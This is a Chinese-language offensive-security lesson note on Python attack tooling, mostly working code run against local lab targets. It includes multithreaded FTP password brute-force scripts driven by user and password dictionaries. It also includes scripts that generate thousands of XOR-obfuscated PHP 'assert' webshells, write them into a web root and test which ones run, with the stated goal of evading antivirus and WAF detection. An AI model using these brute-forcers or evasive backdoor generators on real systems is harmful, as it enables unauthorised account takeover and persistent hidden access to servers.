



# 思维导图

![](image78/78.png)

# 知识点

- 本课知识点：

  协议模块使用，Request 爬虫技术，简易多线程技术，编码技术，Bypass 后门技术

- 学习目的：

  掌握利用强大的模块实现各种协议连接操作(爆破或利用等)，配合 Fuzz 吊打 WAF 等



# 演示案例：

### Python 开发-简单多线程技术实现脚本

#### **案例 1-Python 开发-简单多线程技术实现脚本 **

**queue，threading 模块使用**

[quickeasyftpserver.zip](https://lcba.lanzouy.com/iAMePxl378h)

```python
import ftplib
import queue
import threading


def ftp_check():
    while not q.empty():
        dic = q.get()
        dic = dic.split('|')
        username = dic[0]
        password = dic[1]
        ftp = ftplib.FTP()
        try:
            ftp.connect('10.13.135.87', 21)
            ftp.login(username, password)
            ftp.retrlines('list')
            print(username + '|' + password + '--------' + 'Logged in')
            ftp.close()
        except ftplib.all_errors as e:
            ftp.close()
            print(username + '|' + password + '--------' + 'failed')
            pass


if __name__ == '__main__':
    thread = 10
    q = queue.Queue()
    for username in open('user.txt'):
        for password in open('password.txt'):
            username = username.replace('\n', '')
            password = password.replace('\n', '')
            dlist = username + '|' + password
            q.put(dlist)

    for x in range(thread):
        t = threading.Thread(target=ftp_check)
        t.start()
```



### Python 开发-利用 FTP 模块实现协议爆破脚本

#### **案例 2-Python 开发-利用 FTP 模块实现协议爆破脚本**

- 1.ftplib 模块使用

- 2.遍历用户及密码字典
- 3.尝试连接执行命令判断

~~~python


```python
import ftplib
from ftplib import FTP

ftp=FTP()
for username in open('user.txt'):
    for password in open('password.txt'):
        username = username.replace('\n', '')
        password = password.replace('\n', '')
        try:
            ftp.connect('10.13.1.81', 21)
            ftp.login(username, password)
            ftp.retrlines('list')
            print(username + '|' + password + '--------'+'Logged in')
            ftp.close()

        except ftplib.all_errors as e:
            ftp.close()
            print(username + '|' + password +'--------'+ 'failed')
            continue
```


~~~

![](image78/78-2.png)

![78-3](image78/78-3.png)

### Python 开发-配合 Fuzz 实现免杀异或 Shell 脚本

#### **案例 3-Python 开发-配合 Fuzz 实现免杀异或 Shell 脚本**

- 1.免杀异或 Shell 原理讲解及开发思路（参考及举例：!^@,"^?等）

- 2.基于 Fuzz 思路生成大量 Payload 代码并有序命名写入网站文件中

- 3.基于多线程实现批量访问 Shell 文件并提交测试是否正常连接回显

#### **无字符特征马**

[PHP异或_](https://blog.csdn.net/qq_41617034/article/details/104441032)

在PHP中，两个变量的值进行异或时，会先将两个变量的值转换为ASCII，再将ASCII转换为二进制，对两对二进制数据进行异或，异或完，再将结果转为ASCII，最后将ASCII转为字符串，即为最终结果。

#### ASCII表

| Bin(二进制) | Oct(八进制) | Dec(十进制) | Hex(十六进制) | 缩写/字符                   | 解释         |
| ----------- | ----------- | ----------- | ------------- | --------------------------- | ------------ |
| 0000 0000   | 00          | 0           | 0x00          | NUL(null)                   | 空字符       |
| 0000 0001   | 01          | 1           | 0x01          | SOH(start of headline)      | 标题开始     |
| 0000 0010   | 02          | 2           | 0x02          | STX (start of text)         | 正文开始     |
| 0000 0011   | 03          | 3           | 0x03          | ETX (end of text)           | 正文结束     |
| 0000 0100   | 04          | 4           | 0x04          | EOT (end of transmission)   | 传输结束     |
| 0000 0101   | 05          | 5           | 0x05          | ENQ (enquiry)               | 请求         |
| 0000 0110   | 06          | 6           | 0x06          | ACK (acknowledge)           | 收到通知     |
| 0000 0111   | 07          | 7           | 0x07          | BEL (bell)                  | 响铃         |
| 0000 1000   | 010         | 8           | 0x08          | BS (backspace)              | 退格         |
| 0000 1001   | 011         | 9           | 0x09          | HT (horizontal tab)         | 水平制表符   |
| 0000 1010   | 012         | 10          | 0x0A          | LF (NL line feed, new line) | 换行键       |
| 0000 1011   | 013         | 11          | 0x0B          | VT (vertical tab)           | 垂直制表符   |
| 0000 1100   | 014         | 12          | 0x0C          | FF (NP form feed, new page) | 换页键       |
| 0000 1101   | 015         | 13          | 0x0D          | CR (carriage return)        | 回车键       |
| 0000 1110   | 016         | 14          | 0x0E          | SO (shift out)              | 不用切换     |
| 0000 1111   | 017         | 15          | 0x0F          | SI (shift in)               | 启用切换     |
| 0001 0000   | 020         | 16          | 0x10          | DLE (data link escape)      | 数据链路转义 |
| 0001 0001   | 021         | 17          | 0x11          | DC1 (device control 1)      | 设备控制1    |
| 0001 0010   | 022         | 18          | 0x12          | DC2 (device control 2)      | 设备控制2    |
| 0001 0011   | 023         | 19          | 0x13          | DC3 (device control 3)      | 设备控制3    |
| 0001 0100   | 024         | 20          | 0x14          | DC4 (device control 4)      | 设备控制4    |
| 0001 0101   | 025         | 21          | 0x15          | NAK (negative acknowledge)  | 拒绝接收     |
| 0001 0110   | 026         | 22          | 0x16          | SYN (synchronous idle)      | 同步空闲     |
| 0001 0111   | 027         | 23          | 0x17          | ETB (end of trans. block)   | 结束传输块   |
| 0001 1000   | 030         | 24          | 0x18          | CAN (cancel)                | 取消         |
| 0001 1001   | 031         | 25          | 0x19          | EM (end of medium)          | 媒介结束     |
| 0001 1010   | 032         | 26          | 0x1A          | SUB (substitute)            | 代替         |
| 0001 1011   | 033         | 27          | 0x1B          | ESC (escape)                | 换码(溢出)   |
| 0001 1100   | 034         | 28          | 0x1C          | FS (file separator)         | 文件分隔符   |
| 0001 1101   | 035         | 29          | 0x1D          | GS (group separator)        | 分组符       |
| 0001 1110   | 036         | 30          | 0x1E          | RS (record separator)       | 记录分隔符   |
| 0001 1111   | 037         | 31          | 0x1F          | US (unit separator)         | 单元分隔符   |
| 0010 0000   | 040         | 32          | 0x20          | (space)                     | 空格         |
| 0010 0001   | 041         | 33          | 0x21          | !                           | 叹号         |
| 0010 0010   | 042         | 34          | 0x22          | "                           | 双引号       |
| 0010 0011   | 043         | 35          | 0x23          | #                           | 井号         |
| 0010 0100   | 044         | 36          | 0x24          | $                           | 美元符       |
| 0010 0101   | 045         | 37          | 0x25          | %                           | 百分号       |
| 0010 0110   | 046         | 38          | 0x26          | &                           | 和号         |
| 0010 0111   | 047         | 39          | 0x27          | '                           | 闭单引号     |
| 0010 1000   | 050         | 40          | 0x28          | (                           | 开括号       |
| 0010 1001   | 051         | 41          | 0x29          | )                           | 闭括号       |
| 0010 1010   | 052         | 42          | 0x2A          | *                           | 星号         |
| 0010 1011   | 053         | 43          | 0x2B          | +                           | 加号         |
| 0010 1100   | 054         | 44          | 0x2C          | ,                           | 逗号         |
| 0010 1101   | 055         | 45          | 0x2D          | -                           | 减号/破折号  |
| 0010 1110   | 056         | 46          | 0x2E          | .                           | 句号         |
| 0010 1111   | 057         | 47          | 0x2F          | /                           | 斜杠         |
| 0011 0000   | 060         | 48          | 0x30          | 0                           | 字符0        |
| 0011 0001   | 061         | 49          | 0x31          | 1                           | 字符1        |
| 0011 0010   | 062         | 50          | 0x32          | 2                           | 字符2        |
| 0011 0011   | 063         | 51          | 0x33          | 3                           | 字符3        |
| 0011 0100   | 064         | 52          | 0x34          | 4                           | 字符4        |
| 0011 0101   | 065         | 53          | 0x35          | 5                           | 字符5        |
| 0011 0110   | 066         | 54          | 0x36          | 6                           | 字符6        |
| 0011 0111   | 067         | 55          | 0x37          | 7                           | 字符7        |
| 0011 1000   | 070         | 56          | 0x38          | 8                           | 字符8        |
| 0011 1001   | 071         | 57          | 0x39          | 9                           | 字符9        |
| 0011 1010   | 072         | 58          | 0x3A          | :                           | 冒号         |
| 0011 1011   | 073         | 59          | 0x3B          | ;                           | 分号         |
| 0011 1100   | 074         | 60          | 0x3C          | <                           | 小于         |
| 0011 1101   | 075         | 61          | 0x3D          | =                           | 等号         |
| 0011 1110   | 076         | 62          | 0x3E          | >                           | 大于         |
| 0011 1111   | 077         | 63          | 0x3F          | ?                           | 问号         |
| 0100 0000   | 0100        | 64          | 0x40          | @                           | 电子邮件符号 |
| 0100 0001   | 0101        | 65          | 0x41          | A                           | 大写字母A    |
| 0100 0010   | 0102        | 66          | 0x42          | B                           | 大写字母B    |
| 0100 0011   | 0103        | 67          | 0x43          | C                           | 大写字母C    |
| 0100 0100   | 0104        | 68          | 0x44          | D                           | 大写字母D    |
| 0100 0101   | 0105        | 69          | 0x45          | E                           | 大写字母E    |
| 0100 0110   | 0106        | 70          | 0x46          | F                           | 大写字母F    |
| 0100 0111   | 0107        | 71          | 0x47          | G                           | 大写字母G    |
| 0100 1000   | 0110        | 72          | 0x48          | H                           | 大写字母H    |
| 0100 1001   | 0111        | 73          | 0x49          | I                           | 大写字母I    |
| 01001010    | 0112        | 74          | 0x4A          | J                           | 大写字母J    |
| 0100 1011   | 0113        | 75          | 0x4B          | K                           | 大写字母K    |
| 0100 1100   | 0114        | 76          | 0x4C          | L                           | 大写字母L    |
| 0100 1101   | 0115        | 77          | 0x4D          | M                           | 大写字母M    |
| 0100 1110   | 0116        | 78          | 0x4E          | N                           | 大写字母N    |
| 0100 1111   | 0117        | 79          | 0x4F          | O                           | 大写字母O    |
| 0101 0000   | 0120        | 80          | 0x50          | P                           | 大写字母P    |
| 0101 0001   | 0121        | 81          | 0x51          | Q                           | 大写字母Q    |
| 0101 0010   | 0122        | 82          | 0x52          | R                           | 大写字母R    |
| 0101 0011   | 0123        | 83          | 0x53          | S                           | 大写字母S    |
| 0101 0100   | 0124        | 84          | 0x54          | T                           | 大写字母T    |
| 0101 0101   | 0125        | 85          | 0x55          | U                           | 大写字母U    |
| 0101 0110   | 0126        | 86          | 0x56          | V                           | 大写字母V    |
| 0101 0111   | 0127        | 87          | 0x57          | W                           | 大写字母W    |
| 0101 1000   | 0130        | 88          | 0x58          | X                           | 大写字母X    |
| 0101 1001   | 0131        | 89          | 0x59          | Y                           | 大写字母Y    |
| 0101 1010   | 0132        | 90          | 0x5A          | Z                           | 大写字母Z    |
| 0101 1011   | 0133        | 91          | 0x5B          | [                           | 开方括号     |
| 0101 1100   | 0134        | 92          | 0x5C          | \                           | 反斜杠       |
| 0101 1101   | 0135        | 93          | 0x5D          | ]                           | 闭方括号     |
| 0101 1110   | 0136        | 94          | 0x5E          | ^                           | 脱字符       |
| 0101 1111   | 0137        | 95          | 0x5F          | _                           | 下划线       |
| 0110 0000   | 0140        | 96          | 0x60          | `                           | 开单引号     |
| 0110 0001   | 0141        | 97          | 0x61          | a                           | 小写字母a    |
| 0110 0010   | 0142        | 98          | 0x62          | b                           | 小写字母b    |
| 0110 0011   | 0143        | 99          | 0x63          | c                           | 小写字母c    |
| 0110 0100   | 0144        | 100         | 0x64          | d                           | 小写字母d    |
| 0110 0101   | 0145        | 101         | 0x65          | e                           | 小写字母e    |
| 0110 0110   | 0146        | 102         | 0x66          | f                           | 小写字母f    |
| 0110 0111   | 0147        | 103         | 0x67          | g                           | 小写字母g    |
| 0110 1000   | 0150        | 104         | 0x68          | h                           | 小写字母h    |
| 0110 1001   | 0151        | 105         | 0x69          | i                           | 小写字母i    |
| 0110 1010   | 0152        | 106         | 0x6A          | j                           | 小写字母j    |
| 0110 1011   | 0153        | 107         | 0x6B          | k                           | 小写字母k    |
| 0110 1100   | 0154        | 108         | 0x6C          | l                           | 小写字母l    |
| 0110 1101   | 0155        | 109         | 0x6D          | m                           | 小写字母m    |
| 0110 1110   | 0156        | 110         | 0x6E          | n                           | 小写字母n    |
| 0110 1111   | 0157        | 111         | 0x6F          | o                           | 小写字母o    |
| 0111 0000   | 0160        | 112         | 0x70          | p                           | 小写字母p    |
| 0111 0001   | 0161        | 113         | 0x71          | q                           | 小写字母q    |
| 0111 0010   | 0162        | 114         | 0x72          | r                           | 小写字母r    |
| 0111 0011   | 0163        | 115         | 0x73          | s                           | 小写字母s    |
| 0111 0100   | 0164        | 116         | 0x74          | t                           | 小写字母t    |
| 0111 0101   | 0165        | 117         | 0x75          | u                           | 小写字母u    |
| 0111 0110   | 0166        | 118         | 0x76          | v                           | 小写字母v    |
| 0111 0111   | 0167        | 119         | 0x77          | w                           | 小写字母w    |
| 0111 1000   | 0170        | 120         | 0x78          | x                           | 小写字母x    |
| 0111 1001   | 0171        | 121         | 0x79          | y                           | 小写字母y    |
| 0111 1010   | 0172        | 122         | 0x7A          | z                           | 小写字母z    |
| 0111 1011   | 0173        | 123         | 0x7B          | {                           | 开花括号     |
| 0111 1100   | 0174        | 124         | 0x7C          | \|                          | 垂线         |
| 0111 1101   | 0175        | 125         | 0x7D          | }                           | 闭花括号     |
| 0111 1110   | 0176        | 126         | 0x7E          | ~                           | 波浪号       |
| 0111 1111   | 0177        | 127         | 0x7F          | DEL (delete)                | 删除         |

```shell
0010 0001      33       !  
0010 1000      40		(
异或运算

0000 1001      9
```

![](image78/78-4.png)

手工测试

![](image78/78-5.png)



![](image78/78-6.png)

#### bypass脚本

```python
""""
php异或
PHP之异或运算符---"^"
一.当均为数字时候
则先将数字转换成二进制数,然后再运算,运算规则也简单!
就是:
同则0,不同则1:运算的两个数在同一个位上相同则为0,不相同则为1!

二.当均为字符时
则先将字符转换成其对应的ASCII码,然后对产生的数字进行绝对值减运算!然后返回值转换成对应的字符!
如果两字符串长度不一样,则从两字符串起始位置起开始计算!之后多余的自动转换为空(视为一样)!

"""

import requests
import time

def xor_shell_creat():
    for i in range(0, 128):
        for j in range(0, 128):
            payload = "'" + chr(i) + "'" + "^" + "'" + chr(j) + "'"
            shell = "<?php $a=(" + payload + ").'ssert';$a($_POST[x]);?>"
            # print(shell)
            filename = str(i) + 'xor' + str(j) + '.php'
            with open('E:/phpstudy/PHPTutorial/WWW/test/' + filename, 'a') as f:
                f.write(shell)
                print(filename + '写入成功')
                f.close()
            url='http://127.0.0.1/test/'+filename
            data={
                'x':'phpinfo();'
            }
            result = requests.post(url,data=data).content.decode('utf-8')
            if 'DESKTOP-1CDDLPV' in result:
                print('check->' + filename + '->ok')
            else:
                print('check->' + filename + '->no')
            # time.sleep(1)

if __name__ == '__main__':
    xor_shell_creat()



```



![78-7](image78/78-7.png)

生成的shell很多！

![78-8](image78/78-8.png)



#### bypassplus脚本

多进程—莫名速度好垃（不知道为什么好慢！哈哈）

```python
import queue

import requests
import time
import threading

def xor_shell_check():
    while not q.empty():
        filename = q.get()
        url = 'http://127.0.0.1/test/' + filename
        data = {
            'x': 'phpinfo();'
        }
        result = requests.post(url, data=data).content.decode('utf-8')
        if 'DESKTOP-1CDDLPV' in result:
            print('check->' + filename + '->ok')
        else:
            print('check->' + filename + '->no')
        time.sleep(1)



if __name__ == '__main__':
    q=queue.Queue()
    for i in range(0, 128):
        for j in range(0, 128):
            payload = "'" + chr(i) + "'" + "^" + "'" + chr(j) + "'"
            shell = "<?php $a=(" + payload + ").'ssert';$a($_POST[x]);?>"
            # print(shell)
            filename = str(i) + 'xor' + str(j) + '.php'
            q.put(filename)
            with open('E:/phpstudy/PHPTutorial/WWW/test/' + filename, 'a') as f:
                f.write(shell)
                print(filename + '写入成功')
                f.close()
    for x in range(10):
        t = threading.Thread(target=xor_shell_check)
        t.start()
```



# 涉及资源：

[quickeasyftpserver.zip](https://lcba.lanzouy.com/iAMePxl378h)

[https://github.com/zhanye/fuzzdb](https://github.com/zhanye/fuzzdb)
[https://github.com/stemmm/fuzzDicts](https://github.com/stemmm/fuzzDicts)
[https://www.cnblogs.com/liujizhou/p/11806497.html](https://www.cnblogs.com/liujizhou/p/11806497.html)
[python ftplib模块 ](https://www.cnblogs.com/kaituorensheng/p/4480512.html)
[https://blog.csdn.net/qq_41617034/article/details/104441032](https://blog.csdn.net/qq_41617034/article/details/104441032)
[https://pan.baidu.com/s/13y3U6jX3WUYmnfKnXT8abQ 提取码：
xiao](https://pan.baidu.com/s/13y3U6jX3WUYmnfKnXT8abQ 提取码：
xiao)